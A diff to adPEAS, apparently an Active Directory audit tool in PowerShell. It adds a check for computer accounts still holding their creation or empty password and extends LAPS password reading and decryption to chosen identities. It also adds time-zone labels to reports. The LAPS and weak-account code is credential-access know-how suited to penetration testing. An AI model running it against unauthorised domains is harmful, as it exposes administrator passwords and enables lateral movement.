+                        if ($nativePolicy.ContainsKey('ADPasswordEncryptionEnabled') -and [string]$nativePolicy['ADPasswordEncryptionEnabled'] -eq '0') {
+                            $decryptorParts += "none - stored unencrypted (GPO '$policyName')"
+                            continue
+                        }
+                        $principalValue = ''
+                        if ($nativePolicy.ContainsKey('ADPasswordEncryptionPrincipal')) { $principalValue = ([string]$nativePolicy['ADPasswordEncryptionPrincipal']).Trim() }
+                        if (-not $principalValue) { continue }
+                        $principalText = $principalValue
+                        if ($principalValue -match '^S-1-\d+(-\d+)+$') {
+                            $resolvedName = ConvertFrom-SID -SID $principalValue
+                            if ($resolvedName -and -not ([string]$resolvedName).Contains($principalValue)) {
+                                $principalText = "$resolvedName ($principalValue)"
+                            } elseif ($resolvedName) {
+                                $principalText = [string]$resolvedName
+                            }
+                        }
+                        $decryptorParts += "$principalText (GPO '$policyName')"
+                    }
+                }
+                $decryptorParts += 'Domain Admins (default where no policy names one)'
+                Show-Line "Windows LAPS decryptor (from GPO): $($decryptorParts -join '; ')" -Class Note
             }
         } catch {
             Write-Log "[Get-LAPSPermissions] Error: $_" -Level Error
@@ -83562,6 +84501,63 @@ function Get-ComputerPasswordAge {
     }
     end {
         Write-Log "[Get-ComputerPasswordAge] Check completed"
+    }
+}
+function Get-ComputerInitialPassword {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$false)]
+        [string]$Domain,
+        [Parameter(Mandatory=$false)]
+        [string]$Server,
+        [Parameter(Mandatory=$false)]
+        [System.Management.Automation.PSCredential]$Credential
+    )
+    begin {
+        Write-Log "[Get-ComputerInitialPassword] Starting check"
+    }
+    process {
+        try {
+            if (-not (Ensure-LDAPConnection @PSBoundParameters)) {
+                return
+            }
+            Show-SubHeader "Searching for computer accounts that still carry the password they were created with..." -ObjectType "ComputerInitialPassword"
+            $candidates = @(Get-ComputerInitialPasswordCandidate @PSBoundParameters)
+            $neverSet  = @($candidates | Where-Object { $_.passwordSinceCreation -eq 'Never set - empty password' })
+            $inUse     = @($candidates | Where-Object { $_.passwordSinceCreation -eq 'Unchanged, in use' })
+            $neverUsed = @($candidates | Where-Object { $_.passwordSinceCreation -eq 'Unchanged, never used' })
+            if ($neverSet.Count + $inUse.Count + $neverUsed.Count -eq 0) {
+                Show-Line "No enabled computer account still carries the password it was created with" -Class Secure
+                return
+            }
+            if ($neverSet.Count -gt 0) {
+                Show-Line "$($neverSet.Count) computer account(s) never had a password set - over NTLM they log on with an empty one:" -Class Finding
+                foreach ($computer in $neverSet) {
+                    $computer | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'ComputerInitialPassword' -Force
+                    Show-Object $computer -Class Finding
+                }
+            }
+            if ($inUse.Count -gt 0) {
+                Show-Line "$($inUse.Count) computer account(s) no Windows client joined are in use with their creation password:" -Class Hint
+                foreach ($computer in $inUse) {
+                    $computer | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'ComputerInitialPassword' -Force
+                    Show-Object $computer -Class Hint
+                }
+            }
+            if ($neverUsed.Count -gt 0) {
+                Show-Line "$($neverUsed.Count) computer account(s) were created in advance and never used - the password may be the default:" -Class Hint
+                foreach ($computer in $neverUsed) {
+                    $computer | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'ComputerInitialPassword' -Force
+                    Show-Object $computer -Class Hint
+                }
+            }
+        } catch {
+            Write-Log "[Get-ComputerInitialPassword] Error: $_" -Level Error
+            Show-Line "Error during check - computer accounts with their creation password could not be evaluated: $_" -Class Finding
+        }
+    }
+    end {
+        Write-Log "[Get-ComputerInitialPassword] Check completed"
     }
 }
 function ConvertTo-NetworkMapIPv4Number {
@@ -92385,25 +93381,20 @@ function Get-CredentialExposure {
         Write-Log "[Get-CredentialExposure] Check completed"
     }
 }
-function Resolve-LAPSEncryptedComputer {
+function Convert-LAPSRawComputer {
     [CmdletBinding()]
-    [OutputType([bool])]
     param(
         [Parameter(Mandatory = $true)]
-        [AllowNull()]
-        $Computer
+        $Computer,
+        [Parameter(Mandatory = $false)]
+        [string[]]$Except = @()
     )
-    if (-not $Computer) { return $false }
-    $blob = $Computer.'msLAPS-EncryptedPassword'
-    if (-not $blob) { return $false }
-    $decryptedInfo = ConvertFrom-LAPSEncryptedPassword -Blob $blob -Decrypt
-    if (-not $decryptedInfo -or -not $decryptedInfo.DecryptionSucceeded) { return $false }
     foreach ($property in @($Computer.PSObject.Properties)) {
-        if ($property.Name -ieq 'msLAPS-EncryptedPassword') { continue }
+        if ($Except -icontains $property.Name) { continue }
         try {
             $converted = ConvertFrom-LDAPAttribute -Name $property.Name -Value $property.Value
         } catch {
-            Write-Log "[Resolve-LAPSEncryptedComputer] Could not convert $($property.Name): $_"
+            Write-Log "[Convert-LAPSRawComputer] Could not convert $($property.Name): $_"
             continue
         }
         $Computer.PSObject.Properties.Remove($property.Name)
@@ -92412,6 +93403,31 @@ function Resolve-LAPSEncryptedComputer {
             $Computer | Add-Member -NotePropertyName $convertedName -NotePropertyValue $converted[$convertedName] -Force
         }
     }
+}
+function Resolve-LAPSEncryptedComputer {
+    [CmdletBinding()]
+    [OutputType([bool])]
+    param(
+        [Parameter(Mandatory = $true)]
+        [AllowNull()]
+        $Computer,
+        [Parameter(Mandatory = $false)]
+        [ref]$DecryptionError
+    )
+    if ($DecryptionError) { $DecryptionError.Value = $null }
+    if (-not $Computer) { return $false }
+    $blob = $Computer.'msLAPS-EncryptedPassword'
+    if (-not $blob) { return $false }
+    $decryptedInfo = ConvertFrom-LAPSEncryptedPassword -Blob $blob -Decrypt
+    if (-not $decryptedInfo -or -not $decryptedInfo.DecryptionSucceeded) {
+        if ($DecryptionError) {
+            $DecryptionError.Value = if ($decryptedInfo -and $decryptedInfo.DecryptionError) { [string]$decryptedInfo.DecryptionError }
+                                     elseif ($decryptedInfo) { 'decryption returned no password' }
+                                     else { 'the blob could not be parsed' }
+        }
+        return $false
+    }
+    Convert-LAPSRawComputer -Computer $Computer -Except @('msLAPS-EncryptedPassword')
     $Computer | Add-Member -NotePropertyName 'msLAPS-Password' -NotePropertyValue $decryptedInfo.Password -Force
     $Computer | Add-Member -NotePropertyName 'msLAPS-Account' -NotePropertyValue $decryptedInfo.Account -Force
     $Computer | Add-Member -NotePropertyName 'msLAPS-Updated' -NotePropertyValue $decryptedInfo.UpdateTimestamp -Force
@@ -92426,18 +93442,42 @@ function Get-LAPSCredentialAccess {
         [Parameter(Mandatory=$false)]
         [string]$Server,
         [Parameter(Mandatory=$false)]
-        [System.Management.Automation.PSCredential]$Credential
+        [System.Management.Automation.PSCredential]$Credential,
+        [Parameter(Mandatory=$false, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
+        [Alias('DistinguishedName')]
+        [ValidateNotNullOrEmpty()]
+        [string[]]$Identity
     )
     begin {
         Write-Log "[Get-LAPSCredentialAccess] Starting check"
+        $givenIdentities = New-Object System.Collections.Generic.List[string]
+        $seenIdentity = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
+        $identityGiven = $false
     }
     process {
+        if (-not $PSBoundParameters.ContainsKey('Identity')) { return }
+        $identityGiven = $true
+        foreach ($one in @($Identity)) {
+            if ($seenIdentity.Add([string]$one)) { $givenIdentities.Add([string]$one) }
+        }
+    }
+    end {
         try {
-            if (-not (Ensure-LDAPConnection @PSBoundParameters)) {
+            $connectionParams = @{}
+            foreach ($connectionKey in @('Domain', 'Server', 'Credential')) {
+                if ($PSBoundParameters.ContainsKey($connectionKey)) {
+                    $connectionParams[$connectionKey] = $PSBoundParameters[$connectionKey]
+                }
+            }
+            if (-not (Ensure-LDAPConnection @connectionParams)) {
                 return
             }
             Show-SubHeader "Testing LAPS password read access for current user..." -ObjectType "LAPSCredential"
-            $lapsSchema = Get-LAPSSchemaPresence @PSBoundParameters
+            if (-not $identityGiven -and $PSCmdlet.MyInvocation.ExpectingInput) {
+                Show-Line "No computer came down the pipeline - nothing was tested" -Class "Note"
+                return
+            }
+            $lapsSchema = Get-LAPSSchemaPresence @connectionParams
             $lapsLegacySchemaPresent = $lapsSchema.LegacyPresent
             $windowsLAPSSchemaPresent = $lapsSchema.NativePresent
             if (-not $lapsLegacySchemaPresent -and -not $windowsLAPSSchemaPresent) {
@@ -92446,13 +93486,68 @@ function Get-LAPSCredentialAccess {
             }
             $readableComputers = @()
             $withheldCount = 0
+            $decryptFailures = @()
+            $untestedEncryptedCount = 0
+            $offDomainCount = 0
+            $withheldDecryptors = @()
+            $offDomainDecryptors = @()
+            $authorizedUnreadComputers = @()
+            $identityList = @($givenIdentities)
+            $dnBatchSize = 50
+            $dnKey = { param([string]$DN) ($DN -replace ',\s+', ',').ToLowerInvariant() }
+            $dnFilter = {
+                param([string[]]$DNs)
+                '(|' + (@($DNs | ForEach-Object { "(distinguishedName=$(Escape-LDAPFilterDN -DistinguishedName $_))" }) -join '') + ')'
+            }
+            $dnToIdentity = @{}
+            $queryScopes = @(@{})
+            if ($identityGiven) {
+                $queryScopes = @()
+                $dnIdentities = @()
+                foreach ($one in $identityList) {
+                    if ($one -match '^CN=[^,]+,.*DC=' -and $one -notmatch '\*') {
+                        $dnIdentities += $one
+                        $dnToIdentity[(& $dnKey $one)] = $one
+                    } else {
+                        $queryScopes += @{ Identity = $one }
+                    }
+                }
+                for ($batchStart = 0; $batchStart -lt $dnIdentities.Count; $batchStart += $dnBatchSize) {
+                    $batchEnd = [Math]::Min($batchStart + $dnBatchSize, $dnIdentities.Count) - 1
+                    $queryScopes += @{ DNs = @($dnIdentities[$batchStart..$batchEnd]) }
+                }
+            }
+            $identityHits = @{}
+            $getLAPSComputers = {
+                param([string]$Filter, [switch]$AsRaw)
+                $seenDN = @{}
+                foreach ($scope in $queryScopes) {
+                    $query = @{ LDAPFilter = $Filter }
+                    if ($scope.ContainsKey('Identity')) { $query['Identity'] = $scope.Identity }
+                    if ($scope.ContainsKey('DNs')) { $query['LDAPFilter'] = "(&$Filter$(& $dnFilter $scope.DNs))" }
+                    if ($AsRaw) { $query['Raw'] = $true }
+                    foreach ($found in @(Get-DomainComputer @query @connectionParams)) {
+                        $foundDN = [string]$found.distinguishedName
+                        if ($scope.ContainsKey('Identity')) { $identityHits[$scope.Identity] = $true }
+                        if ($scope.ContainsKey('DNs') -and $foundDN) {
+                            $hitKey = & $dnKey $foundDN
+                            if ($dnToIdentity.ContainsKey($hitKey)) { $identityHits[$dnToIdentity[$hitKey]] = $true }
+                        }
+                        if ($foundDN) {
+                            if ($seenDN.ContainsKey($foundDN)) { continue }
+                            $seenDN[$foundDN] = $true
+                        }
+                        $found
+                    }
+                }
+            }
             $hasValue = {
                 param($Object, $Attribute)
                 -not [string]::IsNullOrWhiteSpace([string]$Object.$Attribute)
             }
             if ($lapsLegacySchemaPresent) {
                 Write-Log "[Get-LAPSCredentialAccess] Querying for readable Legacy LAPS passwords"
-                $computersWithLegacy = @(Get-DomainComputer -LDAPFilter "(ms-Mcs-AdmPwd=*)" @PSBoundParameters)
+                $computersWithLegacy = @(& $getLAPSComputers -Filter '(ms-Mcs-AdmPwd=*)')
                 foreach ($comp in $computersWithLegacy) {
                     if (& $hasValue $comp 'ms-Mcs-AdmPwd') {
                         $readableComputers += $comp
@@ -92464,7 +93559,7 @@ function Get-LAPSCredentialAccess {
             }
             if ($windowsLAPSSchemaPresent) {
                 Write-Log "[Get-LAPSCredentialAccess] Querying for readable Windows LAPS plaintext passwords"
-                $computersWithPlaintext = @(Get-DomainComputer -LDAPFilter "(msLAPS-Password=*)" @PSBoundParameters)
+                $computersWithPlaintext = @(& $getLAPSComputers -Filter '(msLAPS-Password=*)')
                 foreach ($comp in $computersWithPlaintext) {
                     if (& $hasValue $comp 'msLAPS-Password') {
                         $readableComputers += $comp
@@ -92479,50 +93574,71 @@ function Get-LAPSCredentialAccess {
                 $myTokenGroups = Get-CurrentUserTokenGroups
                 if ($myTokenGroups -and $myTokenGroups.Count -gt 0) {
                     Write-Log "[Get-LAPSCredentialAccess] Got $($myTokenGroups.Count) token groups for current user"
-                    $encryptedComputers = @(Get-DomainComputer -LDAPFilter "(msLAPS-EncryptedPassword=*)" -Raw @PSBoundParameters)
+                    $encryptedComputers = @(& $getLAPSComputers -Filter '(msLAPS-EncryptedPassword=*)' -AsRaw)
                     if (@($encryptedComputers).Count -gt 0) {
                         Write-Log "[Get-LAPSCredentialAccess] Found $($encryptedComputers.Count) computers with encrypted LAPS"
+                        $hostIsDomainMember = Test-adPEASHostDomainMember
                         $authorizedCount = 0
                         foreach ($comp in $encryptedComputers) {
                             $readable = $false
+                            $authorizedUnread = $false
+                            $decryptorName = $null
                             $blob = $comp.'msLAPS-EncryptedPassword'
                             if ($blob) {
                                 $lapsInfo = ConvertFrom-LAPSEncryptedPassword -Blob $blob
+                                $decryptorName = Get-LAPSDecryptorName -Info $lapsInfo
                                 if ($lapsInfo -and $lapsInfo.TargetSID) {
                                     if ($myTokenGroups -contains $lapsInfo.TargetSID) {
                                         $authorizedCount++
-                                        $readable = Resolve-LAPSEncryptedComputer -Computer $comp
-                                        if ($readable) { $readableComputers += $comp }
+                                        $blobLength = 0
+                                        try { $blobLength = ([byte[]]$blob).Length } catch { }
+                                        if ($hostIsDomainMember -eq $false) {
+                                            $authorizedUnread = $true
+                                            $offDomainCount++
+                                            $offDomainDecryptors += $decryptorName
+                                            $authorizedUnreadComputers += [PSCustomObject]@{
+                                                Object     = $comp
+                                                Info       = $lapsInfo
+                                                BlobLength = $blobLength
+                                                Reason     = 'Not tried - this host is not domain-joined'
+                                            }
+                                            Write-Log "[Get-LAPSCredentialAccess] Decryptor group held, not decrypted outside a domain: '$($comp.distinguishedName)'"
+                                        } else {
+                                            $decryptionError = $null
+                                            $readable = Resolve-LAPSEncryptedComputer -Computer $comp -DecryptionError ([ref]$decryptionError)
+                                            if ($readable) {
+                                                $readableComputers += $comp
+                                            } else {
+                                                $authorizedUnread = $true
+                                                $decryptFailures += [PSCustomObject]@{
+                                                    Computer  = [string]$comp.distinguishedName
+                                                    Reason    = $decryptionError
+                                                    Decryptor = $decryptorName
+                                                }
+                                                $failureText = if ($decryptionError) { $decryptionError } else { 'no reason given' }
+                                                $authorizedUnreadComputers += [PSCustomObject]@{
+                                                    Object     = $comp
+                                                    Info       = $lapsInfo
+                                                    BlobLength = $blobLength
+                                                    Reason     = "Not decrypted here - $failureText"
+                                                }
+                                                Write-Log "[Get-LAPSCredentialAccess] Decryptor group held, decryption failed for '$($comp.distinguishedName)': $decryptionError"
+                                            }
+                                        }
                                     }
                                 }
                             }
-                            if (-not $readable) {
+                            if (-not $readable -and -not $authorizedUnread) {
                                 $withheldCount++
+                                if ($decryptorName) { $withheldDecryptors += $decryptorName }
                                 Write-Log "[Get-LAPSCredentialAccess] Encrypted LAPS password not readable for '$($comp.distinguishedName)'"
                             }
                         }
                         Write-Log "[Get-LAPSCredentialAccess] User is authorized for $authorizedCount of $($encryptedComputers.Count) encrypted LAPS computers"
                     }
                 } else {
-                    Write-Log "[Get-LAPSCredentialAccess] No token groups - sampling decryption instead"
-                    $encryptedComputers = @(Get-DomainComputer -LDAPFilter "(msLAPS-EncryptedPassword=*)" -Raw @PSBoundParameters)
-                    $sampleDecrypts = $false
-                    foreach ($comp in @($encryptedComputers | Select-Object -First 3)) {
-                        $sampleInfo = ConvertFrom-LAPSEncryptedPassword -Blob $comp.'msLAPS-EncryptedPassword' -Decrypt
-                        if ($sampleInfo -and $sampleInfo.DecryptionSucceeded) { $sampleDecrypts = $true; break }
-                    }
-                    if ($sampleDecrypts) {
-                        Write-Log "[Get-LAPSCredentialAccess] Fallback: decryption works, trying all $(@($encryptedComputers).Count)"
-                        foreach ($comp in $encryptedComputers) {
-                            if (Resolve-LAPSEncryptedComputer -Computer $comp) {
-                                $readableComputers += $comp
-                            } else {
-                                $withheldCount++
-                            }
-                        }
-                    } else {
-                        $withheldCount += @($encryptedComputers).Count
-                    }
+                    Write-Log "[Get-LAPSCredentialAccess] No token groups - encrypted LAPS passwords not tested"
+                    $untestedEncryptedCount += @(& $getLAPSComputers -Filter '(msLAPS-EncryptedPassword=*)').Count
                 }
             }
             $readerIsPrivileged = $false
@@ -92535,6 +93651,28 @@ function Get-LAPSCredentialAccess {
                 } catch {
                     Write-Log "[Get-LAPSCredentialAccess] Privilege check failed for '$readerName': $_"
                 }
+            }
+            $missingIdentities = @()
+            if ($identityGiven) {
+                foreach ($scope in $queryScopes) {
+                    if ($scope.ContainsKey('DNs')) {
+                        $unhit = @($scope.DNs | Where-Object { -not $identityHits.ContainsKey($_) })
+                        if ($unhit.Count -eq 0) { continue }
+                        $present = @{}
+                        foreach ($found in @(Get-DomainComputer -LDAPFilter (& $dnFilter $unhit) -Properties 'distinguishedName' @connectionParams)) {
+                            $presentKey = & $dnKey ([string]$found.distinguishedName)
+                            if ($dnToIdentity.ContainsKey($presentKey)) { $present[$dnToIdentity[$presentKey]] = $true }
+                        }
+                        $missingIdentities += @($unhit | Where-Object { -not $present.ContainsKey($_) })
+                    } else {
+                        if ($identityHits.ContainsKey($scope.Identity)) { continue }
+                        $existing = @(Get-DomainComputer -Identity $scope.Identity -Properties 'distinguishedName' @connectionParams)
+                        if ($existing.Count -eq 0) { $missingIdentities += $scope.Identity }
+                    }
+                }
+            }
+            foreach ($missing in $missingIdentities) {
+                Show-Line "No computer found for '$missing'" -Class "Note"
             }
             if (@($readableComputers).Count -gt 0) {
                 if ($readerIsPrivileged) {
@@ -92557,18 +93695,65 @@ function Get-LAPSCredentialAccess {
                     }
                 }
                 if ($totalComputers -gt $Script:ProgressThreshold) { Show-Progress -Activity "Checking LAPS credential access" -Completed }
+            } elseif (@($decryptFailures).Count -gt 0) {
+                Write-Log "[Get-LAPSCredentialAccess] Nothing decrypted, $(@($decryptFailures).Count) failure(s) with the decryptor group held"
+            } elseif ($offDomainCount -gt 0) {
+                Write-Log "[Get-LAPSCredentialAccess] Nothing decrypted, $offDomainCount blob(s) with the decryptor group held, host in no domain"
+            } elseif (@($missingIdentities).Count -gt 0 -and @($missingIdentities).Count -eq $identityList.Count) {
+                Write-Log "[Get-LAPSCredentialAccess] No given identity matches a computer"
+            } elseif ($untestedEncryptedCount -gt 0) {
+                Write-Log "[Get-LAPSCredentialAccess] Nothing readable, $untestedEncryptedCount encrypted password(s) not tested"
             } else {
                 Show-Line "No readable LAPS passwords found" -Class "Secure"
             }
+            $showDecryptors = {
+                param([string[]]$Names)
+                foreach ($decryptorGroup in @($Names | Where-Object { $_ } | Group-Object | Sort-Object -Property Count -Descending)) {
+                    Show-KeyValue "Decryptor" "$($decryptorGroup.Name) - $($decryptorGroup.Count) computer(s)"
+                }
+            }
+            if (@($authorizedUnreadComputers).Count -gt 0) {
+                $unreadCount = @($authorizedUnreadComputers).Count
+                if ($readerIsPrivileged) {
+                    Show-Line "$unreadCount computer(s) whose LAPS password this account may decrypt - not decrypted here, expected for this account:" -Class "Hint"
+                } else {
+                    Show-Line "$unreadCount computer(s) whose LAPS password this account may decrypt - not decrypted here:" -Class "Finding"
+                }
+                foreach ($reasonGroup in @($decryptFailures | Group-Object -Property Reason)) {
+                    $reasonText = if ($reasonGroup.Name) { $reasonGroup.Name } else { 'no reason given' }
+                    Show-KeyValue "Decryption error" "$reasonText - $($reasonGroup.Count) computer(s)"
+                }
+                if ($offDomainCount -gt 0) {
+                    Show-KeyValue "Not tried" "This host is not domain-joined - Windows requests the key only on a domain member"
+                }
+                & $showDecryptors @(@($decryptFailures | ForEach-Object { $_.Decryptor }) + @($offDomainDecryptors))
+                foreach ($unread in $authorizedUnreadComputers) {
+                    $computer = $unread.Object
+                    Convert-LAPSRawComputer -Computer $computer -Except @('msLAPS-EncryptedPassword')
+                    $computer | Add-Member -NotePropertyName 'msLAPS-EncryptedPassword' -NotePropertyValue (
+                        Format-LAPSEncryptedValue -Info $unread.Info -Length $unread.BlobLength) -Force
+                    $computer | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'LAPSCredential' -Force
+                    $computer | Add-Member -NotePropertyName 'lapsDecryption' -NotePropertyValue $unread.Reason -Force
+                    if ($readerIsPrivileged) {
+                        $computer | Add-Member -NotePropertyName 'lapsReadContext' -NotePropertyValue (
+                            "Expected - the account this scan runs as is privileged ($readerName)") -Force
+                        Show-Object $computer -Class Hint
+                    } else {
+                        Show-Object $computer -Class Finding
+                    }
+                }
+            }
             if ($withheldCount -gt 0) {
                 Show-Line "$withheldCount computer(s) have a LAPS password stored that this account may not read" -Class "Note"
+                & $showDecryptors $withheldDecryptors
+            }
+            if ($untestedEncryptedCount -gt 0) {
+                Show-Line "$untestedEncryptedCount computer(s) have an encrypted LAPS password that was not tested - this account's groups could not be read" -Class "Note"
             }
         } catch {
             Write-Log "[Get-LAPSCredentialAccess] Error: $_" -Level Error
             Show-Line "Error during check - LAPS password access could not be evaluated: $_" -Class Finding
         }
-    }
-    end {
         Write-Log "[Get-LAPSCredentialAccess] Check completed"
     }
 }
@@ -92669,13 +93854,9 @@ function Get-BitLockerRecoveryKeyAccess {
                             }
                         }
                     }
-                    $whenCreatedRaw = [string]$recoveryObject.whenCreated
-                    if ($whenCreatedRaw -match '^(\d{14})') {
-                        try {
-                            $escrowTime = [datetime]::ParseExact($Matches[1], 'yyyyMMddHHmmss', [System.Globalization.CultureInfo]::InvariantCulture, [System.Globalization.DateTimeStyles]::AssumeUniversal)
-                            $recoveryObject | Add-Member -NotePropertyName 'whenCreated' -NotePropertyValue ((Format-adPEASDate $escrowTime 'yyyy-MM-dd HH:mm:ss') + ' UTC') -Force
-                        } catch {
-                        }
+                    $escrowTime = ConvertFrom-adPEASGeneralizedTime $recoveryObject.whenCreated
+                    if ($null -ne $escrowTime) {
+                        $recoveryObject | Add-Member -NotePropertyName 'whenCreated' -NotePropertyValue $escrowTime -Force
                     }
                     $recoveryObject | Add-Member -NotePropertyName '_adPEASObjectType' -NotePropertyValue 'BitLockerRecoveryKey' -Force
                     Show-Object $recoveryObject -Class Hint
@@ -93646,7 +94827,9 @@ function Export-HTMLReport {
         $domain = if ($Script:LDAPContext) { $Script:LDAPContext.Domain } else { "Unknown" }
         $server = if ($Script:LDAPContext) { $Script:LDAPContext.Server } else { "Unknown" }
         $user = if ($Script:LDAPContext -and $Script:LDAPContext.Username) { $Script:LDAPContext.Username } else { "$env:USERDOMAIN\$env:USERNAME" }
-        $generatedDate = (Format-adPEASDate (Get-Date) 'yyyy-MM-dd HH:mm:ss')
+        $generatedAt = Get-Date
+        $generatedDate = (Format-adPEASDate $generatedAt 'yyyy-MM-dd HH:mm:ss')
+        $timeZoneLabel = (Get-adPEASTimeZoneLabel $generatedAt) + ' (all times in this report)'
         $version = if ($Script:adPEASVersion) { $Script:adPEASVersion } else { "2.0.0" }
         $disclaimer = if ($Script:adPEASDisclaimer) { $Script:adPEASDisclaimer } else { "" }
     }
@@ -93672,6 +94855,7 @@ function Export-HTMLReport {
         $html = $html.Replace('{{SERVER}}', [string](ConvertTo-HtmlEncode $server))
         $html = $html.Replace('{{USER}}', [string](ConvertTo-HtmlEncode $user))
         $html = $html.Replace('{{GENERATED}}', [string]$generatedDate)
+        $html = $html.Replace('{{TIMEZONE}}', [string](ConvertTo-HtmlEncode $timeZoneLabel))
         $html = $html.Replace('{{VERSION}}', [string]$version)
         $html = $html.Replace('{{DEFAULT_THEME}}', [string]$DefaultTheme.ToLower())
         $html = $html.Replace('{{FINDING_COUNT}}', [string]$findingCount)
@@ -97417,6 +98601,10 @@ function Get-HTMLTemplate {
                 <div class="info-item">
                     <div class="label">Generated</div>
                     <div class="value">{{GENERATED}}</div>
+                </div>
+                <div class="info-item">
+                    <div class="label">Time Zone</div>
+                    <div class="value">{{TIMEZONE}}</div>
                 </div>
                 <div class="info-item">
                     <div class="label">Version</div>
@@ -101571,7 +102759,9 @@ function Export-DiffHtmlReport {
     $currentInfo = "$CurrentFile ($($CurrentMeta.Date), $($CurrentMeta.Domain), adPEAS $($CurrentMeta.Version))"
     $comparedCats = if ($SharedCategories.Count -gt 0) { "$($SharedCategories.Count) ($($SharedCategories -join ', '))" } else { "None" }
     $version = if ($Script:adPEASVersion) { $Script:adPEASVersion } else { "2.0.0" }
-    $generatedDate = (Format-adPEASDate (Get-Date) 'yyyy-MM-dd HH:mm:ss')
+    $generatedAt = Get-Date
+    $generatedDate = (Format-adPEASDate $generatedAt 'yyyy-MM-dd HH:mm:ss')
+    $timeZoneLabel = (Get-adPEASTimeZoneLabel $generatedAt) + ' (all times in this report)'
     $domain = $BaselineMeta.Domain
     $html = $html.Replace('{{DOMAIN}}', [string](ConvertTo-HtmlEncode $domain))
     $html = $html.Replace('{{NEW_COUNT}}', [string]$Added.Count)
@@ -101582,6 +102772,7 @@ function Export-DiffHtmlReport {
     $html = $html.Replace('{{CURRENT_INFO}}', [string](ConvertTo-HtmlEncode $currentInfo))
     $html = $html.Replace('{{COMPARED_CATEGORIES}}', [string](ConvertTo-HtmlEncode $comparedCats))
     $html = $html.Replace('{{GENERATED}}', [string]$generatedDate)
+    $html = $html.Replace('{{TIMEZONE}}', [string](ConvertTo-HtmlEncode $timeZoneLabel))
     $html = $html.Replace('{{VERSION}}', [string]$version)
     $html = $html.Replace('{{DIFF_SECTIONS}}', $sectionsHtml.ToString())
     $utf8NoBom = New-Object System.Text.UTF8Encoding $false
@@ -102001,6 +103192,10 @@ function Get-DiffHTMLTemplate {
             <div class="info-item">
                 <div class="label">Generated</div>
                 <div class="value">{{GENERATED}}</div>
+            </div>
+            <div class="info-item">
+                <div class="label">Time Zone</div>
+                <div class="value">{{TIMEZONE}}</div>
             </div>
             <div class="info-item">
                 <div class="label">Version</div>
@@ -102770,9 +103965,13 @@ function ConvertTo-BHAces {
             'ee138f32-c3ec-11d1-bbc5-0080c76670c0' = 'ManageCA'
             '98291c0c-7fd7-11d2-9917-00c04fc2d4cf' = 'ManageCertificates'
         }
+        $lapsSchema = $null
+        try { $lapsSchema = Get-LAPSSchemaPresence @ConnectionParams } catch {
+            Write-Log "[ConvertTo-BHAces] LAPS schema could not be read: $_"
+        }
         foreach ($lapsAttribute in @('ms-Mcs-AdmPwd', 'msLAPS-Password', 'msLAPS-EncryptedPassword')) {
-            if ($Script:PropertyGUIDs -and $Script:PropertyGUIDs.ContainsKey($lapsAttribute)) {
-                $Script:BHExtendedRightGUIDs[$Script:PropertyGUIDs[$lapsAttribute].ToString().ToLower()] = 'ReadLAPSPassword'
+            if ($lapsSchema -and $lapsSchema.AttributeGUIDs -and $lapsSchema.AttributeGUIDs[$lapsAttribute]) {
+                $Script:BHExtendedRightGUIDs[([string]$lapsSchema.AttributeGUIDs[$lapsAttribute]).ToLower()] = 'ReadLAPSPassword'
             }
         }
     }
@@ -104249,7 +105448,7 @@ function Collect-BHIssuancePolicies {
     return $bhPolicies
 }
 #Requires -Version 5.1
-$Script:adPEASVersion = "2.10.2"
+$Script:adPEASVersion = "2.10.2+20261117-1656"
 if ($MyInvocation.MyCommand.Path) {
     $Script:ScriptPath = Split-Path -Parent $MyInvocation.MyCommand.Path
 } else {
@@ -104771,6 +105970,7 @@ try {
             Invoke-CheckWithContext -Category 'Computer' -CheckName 'Get-LAPSConfiguration' -Title 'LAPS Configuration' -Check { Get-LAPSConfiguration -OPSEC:$OPSEC }
             Invoke-CheckWithContext -Category 'Computer' -CheckName 'Get-OutdatedComputers' -Title 'Outdated Computers' -Check { Get-OutdatedComputers -OPSEC:$OPSEC }
             Invoke-CheckWithContext -Category 'Computer' -CheckName 'Get-ComputerPasswordAge' -Title 'Machine Account Password Age' -Check { Get-ComputerPasswordAge }
+            Invoke-CheckWithContext -Category 'Computer' -CheckName 'Get-ComputerInitialPassword' -Title 'Computer Creation Password' -Check { Get-ComputerInitialPassword }
             Invoke-CheckWithContext -Category 'Computer' -CheckName 'Get-NetworkMap' -Title 'Network Map' -Check { Get-NetworkMap -OPSEC:$OPSEC }
         } catch {
             Write-Warning "[adPEAS] Error executing Computer Module: $_"
